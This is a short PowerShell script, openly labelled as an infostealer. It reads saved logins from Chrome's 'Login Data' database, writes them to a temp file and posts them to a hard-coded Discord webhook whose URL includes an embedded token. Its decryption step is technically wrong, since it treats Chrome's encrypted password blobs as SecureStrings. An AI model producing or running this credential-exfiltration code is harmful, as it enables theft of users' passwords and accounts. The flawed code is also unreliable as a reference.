# This PowerShell script steals browser passwords and sends them to a webhook

# Define the path where stolen passwords will be saved
$passwordsFile = "$env:TEMP\stolen_passwords.txt"

# Define the webhook URL to send the stolen passwords
$webhookURL = "https://discord.com/api/webhooks/1216446358924427385/s0Goo9TQVkOiewymw-evLEd1bPo0YJIfLLp2-Agavt4dZ6jEEgzkUUYTcOQWpcWNR-Ts"

# Function to steal passwords from Chrome browser
Function StealChromePasswords {
    $chromePasswords = @()
    $chromeLoginData = Get-ChildItem "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
    If ($chromeLoginData) {
        $chromeDb = New-Object -TypeName System.Data.SQLite.SQLiteConnection("Data Source=$($chromeLoginData.FullName);Version=3;New=False;Compress=True;")
        $chromeDb.Open()
        $cmd = $chromeDb.CreateCommand()
        $cmd.CommandText = "SELECT action_url, username_value, password_value FROM logins"
        $reader = $cmd.ExecuteReader()
        While ($reader.Read()) {
            $password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($reader[2]))
            If ($password) {
                $chromePasswords += "URL: $($reader[0])`nUsername: $($reader[1])`nPassword: $password`n"
            }
        }
        $reader.Close()
        $chromeDb.Close()
    }
    Return $chromePasswords
}

# Function to send stolen passwords to webhook
Function SendPasswordsToWebhook {
    Param(
        [string]$webhookURL,
        [string]$passwords
    )
    $payload = @{
        content = $passwords
    } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhookURL -Method Post -ContentType "application/json" -Body $payload
}

# Main function to steal passwords and send them to webhook
Function Main {
    $chromePasswords = StealChromePasswords
    If ($chromePasswords) {
        $chromePasswords | Out-File -FilePath $passwordsFile
        SendPasswordsToWebhook -webhookURL $webhookURL -passwords (Get-Content $passwordsFile -Raw)
    }
}

# Execute main function
Main
